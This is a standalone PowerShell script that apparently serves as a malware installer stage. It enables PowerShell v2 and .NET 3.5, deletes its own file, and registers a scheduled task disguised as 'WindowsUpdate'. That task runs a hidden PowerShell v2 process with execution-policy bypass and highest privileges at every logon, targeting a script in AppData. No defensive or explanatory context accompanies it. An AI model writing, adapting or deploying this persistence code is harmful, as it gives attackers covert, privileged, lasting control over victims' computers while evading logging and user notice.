$exitState = 1
While($exitState) {
	$powershellState = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 | select -ExpandProperty state
	$donetState = Get-WindowsOptionalFeature -Online -FeatureName 'NetFx3' | select -ExpandProperty state
	if ($powershellState -eq 'Enabled') {
		if ($donetState -eq 'Enabled') {
			Write-Output installed
			$exitState = 0
			Remove-Item -Path "$env:appdata\WindowsUpdate\Update.ps1"
			schtasks /create /tn "WindowsUpdate" /sc ONLOGON /delay 0000:30 /rl highest /tr "powershell.exe -v 2 -noP -w hidden -nonI -ep bypass -file '$env:appdata\WindowsUpdate\Windows.ps1'" /F
			invoke-expression 'powershell -v 2 -ep bypass -file $env:appdata\WindowsUpdate\Windows.ps1'
		} else {
			Enable-WindowsOptionalFeature -Online -FeatureName 'NetFx3'
		}
	} ElseIf ([string]::IsNullOrEmpty($powershellState)) { 
		Write-Output "windows 7"
		$exitState = 0
		Remove-Item -Path "$env:appdata\WindowsUpdate\Update.ps1"
		schtasks /create /tn "WindowsUpdate" /sc ONLOGON /delay 0000:30 /rl highest /tr "powershell.exe -v 2 -noP -w hidden -nonI -ep bypass -file '$env:appdata\WindowsUpdate\Windows.ps1'" /F
		invoke-expression 'powershell -v 2 -ep bypass -file $env:appdata\WindowsUpdate\Windows.ps1'
	} else {
		Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
	}
	Start-Sleep -Seconds 300
}